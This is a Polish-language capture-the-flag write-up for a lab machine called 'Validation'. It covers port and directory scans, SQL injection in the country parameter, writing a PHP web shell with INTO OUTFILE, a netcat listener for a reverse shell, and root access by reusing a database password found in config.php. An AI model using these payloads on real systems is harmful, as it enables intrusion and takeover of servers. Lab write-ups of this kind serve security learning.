Pierwszym krokiem jaki musimy poczynić będzie to skanowanie serwera za pomocą nmap. Możemy tutaj znaleźć ciekawe porty.
```
22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http          Apache httpd 2.4.48 ((Debian))
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
8080/tcp open     http          nginx
```
Również zrobiłem skanowanie katalogów, ale kompletnie nic ciekawego nie udało mi się znaleźć.
```
                        [Status: 200, Size: 16088, Words: 4698, Lines: 269, Duration: 141ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3851ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3851ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3865ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 151ms]
index.php               [Status: 200, Size: 16088, Words: 4698, Lines: 269, Duration: 139ms]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 134ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 161ms]
```
Udałem się na stronę, widniała tam ciekawa funkcja, odpaliłem burp aby prześledzić ruch. Pierwsze o czym pomyślałem, że może być tutaj podatność SQLi, najpierw przetestowałem parametr username= ale nic kompletnie tam nie udało mi się wstrzyknąć, następnie przetestowałem country= i tam już zaczeły się dziać rzeczy. Pierw przetestowałem jak działa komentowanie, jaki język sql działa na tym serwerze polecam w tym przypadku portswigger, posiada fajny cheat sheet.``` ' union select 1, '-- - ``` Przetestowałem ten parametr, i otrzymałem ciekawy błąd.
```
</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
Stack trace:
#0 {main}
  thrown in <b>/var/www/html/account.php</b> on line <b>33</b>
```
Pierwsze co pomyslałem aby spróbować zrobić z tego RCE. 
Znalazłem ciekawy artykuł
```
https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/
```
I znajdował się tam ciekawy ładunek, który postanowiłem wstrzyknąć. Tylko musimy tam trochę pozmieniać aby wszystko działało.
```
' union select 1, '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/dvwa/cmd.php' #
```
Musimy pamiętać aby podmienić ścieżkę oraz komentarz. Udało mi się wstrzyknąć polecenie whoami, wiem, że polecenia wykonuje użytkownik www-data.
Następnie spróbujemy wstrzyknąć reverse-shell aby otrzymać powłokę, pierwszym krokiem będzie włączenie netcat aby nasłuchiwał na wybranym porcie.
``` nc -lvnp 9001```
Za pomocą tego przechwyconego rządania uda nam się uzyskać reverse-shell'a

![obraz](https://github.com/Anogota/Validation/assets/143951834/c37fba7b-8b59-43d1-83cd-2654c0c590c7)

Jak już uzyskałem powłokę, wpisałem ls aby wyświetlić wszystkie pliki.
```
www-data@validation:/var/www/html$ ls
ls
account.php
config.php
css
index.php
js
```
Ukazał mi się ciekawy plik config.php. Więc sprawdziłem co się w nim znajduje i ku mojemy zaskoczeniu.
```
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```
Znajdowało się tam hasło, pierwszym krokiem jaki zrobiłem było to su uhc i hasło, niestety nie zadziało. Następnie su root i hasło i boom, mam root'a strasznie proste :D

![obraz](https://github.com/Anogota/Validation/assets/143951834/5ad8bd2a-7aab-41d7-a2e4-98b683b7530e)
